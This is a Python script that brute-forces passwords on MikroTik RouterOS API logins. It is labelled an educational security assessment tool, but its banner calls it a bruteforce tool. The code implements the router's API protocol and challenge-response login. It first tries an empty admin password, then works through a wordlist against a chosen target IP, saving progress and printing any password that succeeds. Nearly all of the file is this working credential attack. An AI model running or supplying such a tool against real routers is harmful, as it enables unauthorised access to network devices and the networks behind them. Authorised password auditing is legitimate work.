#!/usr/bin/env python3
"""
MikrotikAPI Security Assessment Tool
For educational purposes only - Demonstrates API security concepts and best practices
Version 2.0
"""

import asyncio
import logging
import pathlib
import typing
from dataclasses import dataclass
import ssl
import socket
import hashlib
import binascii
from datetime import datetime
import json
import argparse
from enum import Enum
import sys
from typing import Optional, Dict, List, Union, Any


banner=('''
   __ __ _ _  _____  __ _____ _ _  __  __ ___ _  _ _____ ___   ___ __  ___  ______ 
  |  V  | | |/ / _ \/__\_   _| | |/ / |  \ _ \ || |_   _| __| | __/__\| _ \/ _/ __|
  | \_/ | |   <| v / \/ || | | |   <  | -< v / \/ | | | | _|  | _| \/ | v / \_| _| 
  |_| |_|_|_|\_\_|_\\__/_|_| |_|_|\_\ |__/_|_\\__/  |_|_|___| |_| \__/|_|_\\__/___|
                      |  V  |/  \| _ \ |/ / | \ / | (_  |(_  |                     
                      | \_/ | /\ | v /   <  `\ V /'__/ /__/ /                      
                      |_| |_|_||_|_|_\_|\_\   \_/  \/___\/___|                                          

                    Mikrotik RouterOS API Bruteforce Tool M.1
                            Tadashi Jei ( @TadashiJei )
       Please report tips, suggests and problems to Github Issues or Contact me 
                              via Discord ( _Jeish ) 
                https://github.com/TadashiJei/Mikrotik-Brute-Force
       ''')

class ConnectionType(Enum):
    """Connection type enumeration"""
    PLAIN = "plain"
    SSL = "ssl"

@dataclass
class ConnectionConfig:
    """Connection configuration dataclass"""
    target: str
    port: int = 8728
    username: str = "admin"
    use_ssl: bool = False
    timeout: int = 5
    retry_delay: int = 1
    verbose: bool = False

    @property
    def ssl_context(self) -> Optional[ssl.SSLContext]:
        """Create SSL context if SSL is enabled"""
        if not self.use_ssl:
            return None
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        return context

class RouterAPIError(Exception):
    """Base exception for RouterAPI errors"""
    pass

class AuthenticationError(RouterAPIError):
    """Authentication related errors"""
    pass

class ConnectionError(RouterAPIError):
    """Connection related errors"""
    pass

class ProgressTracker:
    """Tracks and saves progress of security assessment"""
    def __init__(self, save_file: Optional[str] = None):
        self.start_time = datetime.now()
        self.attempts = 0
        self.save_file = save_file
        self.last_password: Optional[str] = None
        self._load_progress()

    def _load_progress(self) -> None:
        """Load progress from save file if it exists"""
        if not self.save_file:
            return
        try:
            with open(self.save_file, 'r') as f:
                data = json.load(f)
                self.last_password = data.get('last_password')
                self.attempts = data.get('attempts', 0)
        except (FileNotFoundError, json.JSONDecodeError):
            pass

    def save_progress(self, current_password: str) -> None:
        """Save current progress to file"""
        if not self.save_file:
            return
        with open(self.save_file, 'w') as f:
            json.dump({
                'last_password': current_password,
                'attempts': self.attempts,
                'timestamp': datetime.now().isoformat()
            }, f)

    def update(self, password: str) -> None:
        """Update progress"""
        self.attempts += 1
        if self.save_file and self.attempts % 20 == 0:
            self.save_progress(password)

    @property
    def elapsed_time(self) -> float:
        """Calculate elapsed time"""
        return (datetime.now() - self.start_time).total_seconds()

    def __str__(self) -> str:
        return f"Attempts: {self.attempts} | Elapsed Time: {self.elapsed_time:.1f}s"

class RouterAPI:
    """Improved RouterOS API implementation"""
    def __init__(self, config: ConnectionConfig):
        self.config = config
        self.socket: Optional[socket.socket] = None
        self.logger = logging.getLogger('RouterAPI')
        self._setup_logging()

    def _setup_logging(self) -> None:
        """Configure logging"""
        level = logging.DEBUG if self.config.verbose else logging.INFO
        logging.basicConfig(
            level=level,
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        )

    async def connect(self) -> None:
        """Establish connection to router"""
        try:
            self.socket = socket.create_connection(
                (self.config.target, self.config.port),
                timeout=self.config.timeout
            )
            if self.config.ssl_context:
                self.socket = self.config.ssl_context.wrap_socket(self.socket)
            self.logger.debug(f"Connected to {self.config.target}:{self.config.port}")
        except socket.error as e:
            raise ConnectionError(f"Failed to connect: {e}")

    def _send_length(self, length: int) -> None:
        """Send word length according to API protocol"""
        if length < 0x80:
            self.socket.sendall(length.to_bytes(1, byteorder='big'))
        elif length < 0x4000:
            length |= 0x8000
            self.socket.sendall(length.to_bytes(2, byteorder='big'))
        elif length < 0x200000:
            length |= 0xC00000
            self.socket.sendall(length.to_bytes(3, byteorder='big'))
        elif length < 0x10000000:
            length |= 0xE0000000
            self.socket.sendall(length.to_bytes(4, byteorder='big'))
        else:
            raise RouterAPIError("Word length exceeds maximum allowed")

    def _receive_length(self) -> int:
        """Receive and decode word length"""
        first = self.socket.recv(1)
        if not first:
            raise ConnectionError("Connection closed by remote host")

        length = int.from_bytes(first, byteorder='big')
        if length < 0x80:
            return length
        elif length < 0xC0:
            length &= ~0x80
            next_byte = self.socket.recv(1)
            return (length << 8) | int.from_bytes(next_byte, byteorder='big')
        # Add other length decoding cases as needed
        raise RouterAPIError("Unsupported word length encoding")

    async def authenticate(self, password: str) -> bool:
        """Attempt authentication with given credentials"""
        try:
            await self.connect()
            result = await self._login(password)
            return result
        except RouterAPIError as e:
            self.logger.debug(f"Authentication failed: {e}")
            return False
        finally:
            self.close()

    async def _login(self, password: str) -> bool:
        """Implement login procedure"""
        # Initial login request
        login_cmd = ['/login', f'=name={self.config.username}', f'=password={password}']
        response = await self._communicate(login_cmd)
        
        if self._is_success(response):
            return True
        elif self._needs_challenge(response):
            return await self._challenge_response_login(password, response)
        return False

    async def _challenge_response_login(self, password: str, initial_response: List[str]) -> bool:
        """Handle challenge-response authentication"""
        challenge = initial_response[0].split('=ret=')[1]
        md5 = hashlib.md5(('\x00' + password).encode('utf-8'))
        md5.update(binascii.unhexlify(challenge))
        
        response = [
            '/login',
            f'=name={self.config.username}',
            f'=response=00{binascii.hexlify(md5.digest()).decode()}'
        ]
        final_response = await self._communicate(response)
        return self._is_success(final_response)

    @staticmethod
    def _is_success(response: List[str]) -> bool:
        """Check if response indicates success"""
        return response and response[0] == '!done'

    @staticmethod
    def _needs_challenge(response: List[str]) -> bool:
        """Check if response indicates challenge-response needed"""
        return response and len(response[0]) > 5 and response[0].startswith('=ret=')

    async def _communicate(self, words: List[str]) -> List[str]:
        """Send commands and receive response"""
        for word in words:
            self._send_length(len(word))
            self.socket.sendall(word.encode())
        self.socket.sendall(b'\x00')  # End of sentence

        response = []
        while True:
            length = self._receive_length()
            if length == 0:
                break
            word = self.socket.recv(length).decode('utf-8', 'replace')
            response.append(word)
        return response

    def close(self) -> None:
        """Close connection"""
        if self.socket:
            self.socket.close()
            self.socket = None

class SecurityTester:
    """Main security testing orchestrator"""
    def __init__(self, config: ConnectionConfig, wordlist_path: str, 
                 save_file: Optional[str] = None):
        self.config = config
        self.wordlist_path = pathlib.Path(wordlist_path)
        self.progress = ProgressTracker(save_file)
        self.logger = logging.getLogger('SecurityTester')

    async def run(self) -> None:
        """Run the security assessment"""
        self.logger.info("Starting security assessment...")
        
        # Test default credentials first
        if await self._test_default_credentials():
            return

        # Process wordlist
        await self._process_wordlist()

    async def _test_default_credentials(self) -> bool:
        """Test default credentials"""
        self.logger.info("Testing default credentials...")
        api = RouterAPI(self.config)
        if await api.authenticate(""):
            self.logger.warning("Default credentials successful!")
            return True
        return False

    async def _process_wordlist(self) -> None:
        """Process the wordlist"""
        try:
            with open(self.wordlist_path, 'r', encoding='utf-8') as f:
                total_lines = sum(1 for _ in f)
            
            with open(self.wordlist_path, 'r', encoding='utf-8') as f:
                for password in f:
                    password = password.strip()
                    if self.progress.last_password and password != self.progress.last_password:
                        continue
                    self.progress.last_password = None
                    
                    if await self._test_password(password, total_lines):
                        return
        except FileNotFoundError:
            self.logger.error(f"Wordlist not found: {self.wordlist_path}")
            sys.exit(1)

    async def _test_password(self, password: str, total: int) -> bool:
        """Test a single password"""
        self.progress.update(password)
        
        if not self.config.verbose:
            self._print_progress(password, total)
        
        api = RouterAPI(self.config)
        if await api.authenticate(password):
            self.logger.info(f"\nSuccessful authentication! Password: {password}")
            return True
        
        await asyncio.sleep(self.config.retry_delay)
        return False

    def _print_progress(self, current: str, total: int) -> None:
        """Print progress information"""
        sys.stdout.write(f"\rTrying {self.progress.attempts}/{total} "
                        f"({self.progress.elapsed_time:.1f}s): {current}")
        sys.stdout.flush()

def parse_arguments() -> argparse.Namespace:
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(
        description="RouterOS API Security Assessment Tool (Educational Purpose)"
    )
    parser.add_argument('-t', '--target', required=True, help="Target IP address")
    parser.add_argument('-p', '--port', type=int, default=8728, help="Target port")
    parser.add_argument('-u', '--username', default='admin', help="Username to test")
    parser.add_argument('-d', '--dictionary', required=True, help="Path to dictionary file")
    parser.add_argument('-s', '--ssl', action='store_true', help="Use SSL connection")
    parser.add_argument('-v', '--verbose', action='store_true', help="Verbose output")
    parser.add_argument('-a', '--autosave', help="Autosave file path")
    parser.add_argument('--delay', type=int, default=1, help="Delay between attempts")
    return parser.parse_args()

async def main() -> None:
    """Main entry point"""
    args = parse_arguments()
    
    config = ConnectionConfig(
        target=args.target,
        port=args.port,
        username=args.username,
        use_ssl=args.ssl,
        verbose=args.verbose,
        retry_delay=args.delay
    )
    
    tester = SecurityTester(config, args.dictionary, args.autosave)
    await tester.run()

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nOperation cancelled by user")
        sys.exit(0)
    except Exception as e:
        logging.error(f"Unexpected error: {e}")
        sys.exit(1)
